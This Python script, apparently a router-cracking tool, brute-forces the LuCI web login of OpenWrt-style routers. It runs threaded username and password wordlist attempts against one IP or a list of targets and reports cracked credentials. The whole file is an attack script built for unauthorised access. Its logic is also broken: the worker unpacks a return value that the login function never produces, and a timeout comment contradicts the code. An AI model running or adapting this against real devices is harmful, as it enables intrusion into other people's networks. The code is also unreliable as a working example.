#!/usr/bin/env python
import argparse
import requests
import http.client
import os
import sys
import concurrent.futures

# Debug function
def patch_send():
    old_send = http.client.HTTPConnection.send
    def new_send(self, data):
        print(data)
        return old_send(self, data)
    http.client.HTTPConnection.send = new_send

# Stderr for statuses
write = sys.stderr.write
flush = sys.stderr.flush

class CredentialFound(Exception):
    pass

def login(ip, user, password):
    TIMEOUT = 5  # 超时时间设置为10秒
    TARGET_URL = "http://{0}/cgi-bin/luci".format(ip)
    ORIGIN = "http://{0}/".format(ip)
    headers = {
        "Proxy-Connection": "keep-alive",
        "Origin": ORIGIN,
        "Referer": TARGET_URL,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36",
    }
    data = {
        "luci_username": user,
        "luci_password": password
    }

    try:
        r1 = requests.post(TARGET_URL, headers=headers, data=data, timeout=TIMEOUT)  # 添加超时参数
        status_code = r1.status_code
        r1.raise_for_status()

        if status_code == 200:
            raise CredentialFound("Correct Credential Found")

        if status_code == 403:
            print("[-] Incorrect password, status code:", status_code)

    except requests.exceptions.Timeout:
        print(f"[-] Timeout reached for {ip}, skipping to the next target.")
        return False  # 返回False，以跳过该URL并继续下一个

    except requests.exceptions.RequestException as e:
        print("Connection error:", e)
        return False  # 连接错误，跳过该URL

    except CredentialFound:
        raise

    return False


def show_attack_report(ML, MP, CI, CP):
    os.system("clear")
    write("[*] 攻击报告：\n")
    write("尝试总数：{0} / {1}\n".format(CI, (ML * MP)))
    write("当前尝试：{0} / {1}\n".format((CI % MP), MP))
    write("当前登录名：{0}\n".format(CP[0]))
    write("当前密码：{0}\n".format(CP[1]))

def read_from_file(filepath):
    if not os.path.exists(filepath):
        print("错误：文件路径不存在：", filepath)
        sys.exit(1)

    with open(filepath, "r") as f:
        return [line.strip() for line in f if line.strip()]

def worker(url, user, pwd):
    success, msg = login(url, user, pwd)
    if success:
        return user, pwd
    if msg:
        print("[-] Error:", msg)
    return None

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", type=str, default=None, help="Router IP")
    parser.add_argument("-l", "--login", type=str, default="users", help="Default username or file containing usernames.")
    parser.add_argument("-p", "--password", type=str, default="passes", help="Default password or file containing passwords.")
    parser.add_argument("-u", "--url_file", type=str, default="urls", help="File containing target URLs.")
    args = parser.parse_args()

    LOGIN_ATTEMPTS = read_from_file(args.login) if os.path.isfile(args.login) else [args.login]
    PASSWORD_ATTEMPTS = read_from_file(args.password) if os.path.isfile(args.password) else [args.password]

    target_urls = read_from_file(args.url_file) if args.ip is None else [args.ip]

    with concurrent.futures.ThreadPoolExecutor() as executor:
        futures = [executor.submit(worker, url, username, password)
                   for url in target_urls
                   for username in LOGIN_ATTEMPTS
                   for password in PASSWORD_ATTEMPTS]

        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                print("[+] Credentials successfully cracked!")
                print("    Username:", result[0])
                print("    Password:", result[1])
                return 0

    print("[+] Attack finished, correct credentials not found.")
    return 1

if __name__ == "__main__":
    main()
